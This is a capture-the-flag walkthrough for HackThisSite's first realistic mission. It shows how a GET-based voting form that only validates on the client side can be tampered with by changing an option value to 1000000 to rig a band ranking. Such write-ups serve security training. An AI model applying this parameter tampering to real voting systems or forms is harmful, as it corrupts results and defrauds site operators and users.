## Realistic Mission 1

### Challenge Message

> From: HeavyMetalRyan
>
> Hey man, I need a big favour from you. Remember that website I showed you once before? Uncle Arnold's Band Review Page?
> Well, a long time ago I made a $500 bet with a friend that my band would be at the top of the list by the end of the year.
> As you already know, two of my band members have died in a horrendous car accident, but this guy still insists that the bet is on.
> I know you're good with computers and stuff, so I was wondering, is there any way for you to hack this website and make my band on the top of the list?
> My band is Raging Inferno. Thanks a lot, man!



## Objective

Manipulate the voting system to move **Raging Inferno** to the top of the ranking.



## Reconnaissance

Submitting a vote generates the following request:

```
https://www.hackthissite.org/missions/realistic/1/v.php?PHPSESSID=SESSION&id=3&vote=1
```

**Method:** GET
**Key parameter:** `vote`



## Source Code Inspection

The voting form:

```html
<form action="v.php" method="get">
    <input type="hidden" name="PHPSESSID" value="SESSION" />
    <input type="hidden" name="id" value="3" />
    <select name="vote">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
        <option value="4">4</option>
        <option value="5">5</option>
    </select>
    <input type="submit" value="vote!" />
</form>
```

The interface restricts vote values to 1–5 using a dropdown.



## Exploitation

Since the restriction exists only on the client side, the HTML can be modified.

Change:

```html
<option value="1">1</option>
```

To:

```html
<option value="1000000">1000000</option>
```

Submit the form.

The server accepts the manipulated value, resulting in a massive vote increase.